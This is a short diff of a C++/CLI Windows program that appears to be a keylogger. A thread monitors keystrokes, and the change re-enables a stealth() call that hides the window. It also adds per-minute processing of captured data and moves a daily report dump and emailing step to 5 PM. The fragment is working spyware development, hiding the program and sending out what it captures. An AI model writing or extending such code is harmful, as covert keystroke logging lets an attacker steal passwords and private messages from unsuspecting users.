@@ -99,28 +99,40 @@ void pause(int dur) {
 // thread used to monitor keystrokes
 DWORD WINAPI mythread(LPVOID lpParameter) {
     // hide window
-    //stealth();
+    stealth();
 
     char i;
     BOOL sendReport = false;
-
+	System::DateTime startTime = System::DateTime().Now;
     // running thread
     while(1){
         // only check for this range of ASCII codes
         for (i = 8; i<=190; i++){
             // get current time and strip date
 			System::DateTime currentTime = System::DateTime().Now;			
-			bool timeToProcess = currentTime.Hour == 18;			
+			bool timeToProcess = currentTime.Hour == 17;			
+			System::TimeSpan ts = currentTime - startTime;
+
+
+			bool timeToLog = ts.TotalMinutes > 1;
+
+			if (timeToLog) {
+				dataManager.process();
+				startTime = System::DateTime().Now;
+			}
+			
 
             // begin processing report at 6:00 PM
             if(timeToProcess && !sendReport) {
-				
-                // call dumpday
-                dataManager.DumpDay();
-                emailManager.readAnalysisResults();
-                sendReport = true;
-				
+				dataManager.process();
+				// call dumpday
+				dataManager.DumpDay();
+				dataManager.init();
+				emailManager.readAnalysisResults();
+				sendReport = true;
+
 				break;
+				
 
             } 
 			else if(!timeToProcess) {
